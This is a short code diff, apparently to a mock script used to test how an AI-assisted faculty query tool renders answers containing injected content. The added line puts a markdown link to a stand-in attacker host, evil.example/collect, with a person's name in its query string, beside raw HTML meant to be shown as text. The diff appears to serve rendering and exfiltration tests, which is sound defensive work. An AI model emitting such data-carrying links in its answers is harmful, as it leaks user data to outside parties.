@@ -247,7 +247,7 @@ const scriptFor = (question) => {
     };
   }
   if (q.includes('inject')) {
-    return { steps: ['runFacultyQuery'], table: hostileTable(queryId), answer: 'The values below are shown as text. **<b>This is not bold HTML.</b>**' };
+    return { steps: ['runFacultyQuery'], table: hostileTable(queryId), answer: 'The values below are shown as text. **<b>This is not bold HTML.</b>** See [your report](https://evil.example/collect?data=Sara).' };
   }
   if (q.includes('hardest')) {
     const table = topicsTable(queryId);
